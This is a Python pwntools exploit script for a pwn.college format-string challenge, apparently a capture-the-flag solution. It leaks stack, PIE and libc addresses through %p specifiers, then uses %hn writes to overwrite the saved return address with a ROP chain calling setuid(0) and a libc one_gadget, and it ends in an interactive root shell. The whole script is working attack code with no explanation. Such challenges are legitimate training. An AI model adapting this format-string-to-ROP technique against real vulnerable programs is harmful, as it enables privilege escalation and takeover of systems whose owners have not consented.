from pwn import p64,u64
from pwn import *
context.binary=e=ELF("./babyfmt_level12.1")
libc=e.libc
gs="""
b *func+379
b *func+486
"""
if args.DEBUG:
    context.log_level="debug"
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gs)
        pause()
elif args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfmt_level12.1")
def better_overwrite_addr(list_to_write :dict):
    write_byte_list=[]
    map_byte_to_addr_list=[]
    for addr in list_to_write:
        value=list_to_write[addr]
        write_byte=[value >> (16*i) & 0xffff for i in range(3)]
        if len(set(write_byte))<3:
             for i in range(3):
                  write_byte[i]+=(i+1)*0x1_0000 #make different
        write_byte_list+=write_byte
        map_byte_to_addr={}
        for i in range(3):
             map_byte_to_addr[write_byte[i]]=addr+i*2
        map_byte_to_addr_list.append(map_byte_to_addr)
    write_byte_list.sort()
    payload =b''
    payload+=b"%c"*58
    payload+=f"%{write_byte_list[0]+0x1_0000-58-108}c".encode() #59
    payload+=b"%hn" #60
    for i in range(1,len(write_byte_list)):
            payload+=f"%{write_byte_list[i]-write_byte_list[i-1]+0x1_0000}c".encode()
            payload+=b"%hn"
    assert(len(payload) < (292))
    payload+=b"X"*(292-len(payload))
    for byte_ in write_byte_list:
            for i in range(len(map_byte_to_addr_list)):
                 try:
                      payload+=p64(map_byte_to_addr_list[i][byte_])
                      map_byte_to_addr_list[i].pop(byte_)
                 except:
                      continue
                 else:
                      break
            payload+=p64(0)
    p.sendline(payload)
#stage1 : leak
p.sendlineafter(b"Have fun!\n",
                b"%c"*6+b"%p"+b"%c"*130+b"%p"+b"%c"*14+b"%p")
p.recvuntil(b"0x")
buffer_locate=int(p.recv(12),16)
log.info(f"buffer @ {hex(buffer_locate)}")
p.recvuntil(b"0x")
e.address=int(p.recv(12),16)-(e.sym.__libc_csu_init)
log.info(f"pie @ {hex(e.address)}")
p.recvuntil(b"0x")
libc.address=int(p.recv(12),16)-(libc.sym.__libc_start_main+243)
log.info(f"libc @ {hex(libc.address)}")
func_saved_rip=buffer_locate+956
pop_rdi_ret=0x0000000000001703+e.address
pop_rdx_ret=0x0000000000142c92+libc.address
better_overwrite_addr({
     func_saved_rip:pop_rdi_ret,
     func_saved_rip+8:0,
     func_saved_rip+0x10:libc.sym.setuid,
     func_saved_rip+0x18:e.sym.func,
})
p.recvuntil(b"Your input is:  ")
new_func_saved_rip=buffer_locate+988
better_overwrite_addr({
     new_func_saved_rip:pop_rdx_ret,
     new_func_saved_rip+0x8:0,
     new_func_saved_rip+0x10:libc.address+0xe3b01 
})
p.recvuntil(b"Your input is:  ")
p.sendline(b"Khongduocthicut\x00")
p.recvuntil(b"Khongduocthicut")
p.interactive()
